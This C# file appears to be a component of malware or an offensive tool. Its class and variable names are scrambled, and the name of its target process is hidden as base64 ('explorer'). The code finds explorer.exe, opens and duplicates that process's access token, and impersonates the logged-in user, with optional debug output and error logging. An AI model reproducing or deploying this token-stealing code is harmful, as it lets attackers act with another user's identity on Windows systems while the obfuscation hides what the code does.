using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

namespace YzTymtbtgFABHvJvj;

internal class aTEqIOEEssdEJGA
{
	public const int IVQRQjrdAyxPY = 2;

	public const int ZQkeoyFiTWc = 8;

	public const int ozKqzHBwhU = 4;

	[DllImport("advapi32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int OpenProcessToken(IntPtr gNHJAbjOxbJnli, int SyhYOxMKcGZa, ref IntPtr vAEzhCugQV);

	[DllImport("kernel32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CloseHandle(IntPtr KUBzACmOhS);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr IUsaQbmkHPUfKQ, int DCXwBwpnzCu, ref IntPtr BXXhyqeGewaRIO);

	private static IntPtr YXJEJoKecDgX(IntPtr rHoefwtRYoaDg, int CGtvPEeJcep)
	{
		IntPtr BXXhyqeGewaRIO = IntPtr.Zero;
		DuplicateToken(rHoefwtRYoaDg, CGtvPEeJcep, ref BXXhyqeGewaRIO);
		return BXXhyqeGewaRIO;
	}

	public static void ODwEoAVGhnn()
	{
		try
		{
			IntPtr vAEzhCugQV = IntPtr.Zero;
			IntPtr zero = IntPtr.Zero;
			Process process = null;
			Process[] processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName == eqCksjvMyn.joRKfFeYni("ZXhwbG9yZXI="))
				{
					process = process2;
				}
			}
			if (OpenProcessToken(process.Handle, 14, ref vAEzhCugQV) == 0)
			{
				return;
			}
			WindowsIdentity windowsIdentity = new WindowsIdentity(vAEzhCugQV);
			if (eqCksjvMyn.aLMUqgosPdtj)
			{
				try
				{
				}
				catch (Exception)
				{
				}
			}
			try
			{
				zero = YXJEJoKecDgX(vAEzhCugQV, 2);
				if (!(IntPtr.Zero == zero))
				{
				}
				windowsIdentity.Impersonate();
				IntPtr token = WindowsIdentity.GetCurrent().Token;
				if (eqCksjvMyn.aLMUqgosPdtj)
				{
					try
					{
						Console.WriteLine("Impersonation-> Token number: {0}", token);
						Console.WriteLine("Impersonation-> Windows ID Name: {0}", WindowsIdentity.GetCurrent().Name);
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
			}
			finally
			{
				CloseHandle(vAEzhCugQV);
			}
		}
		catch (Exception ex3)
		{
			if (eqCksjvMyn.nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(eqCksjvMyn.zRTqZqtXid, "Error while impersonating: " + ex3.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
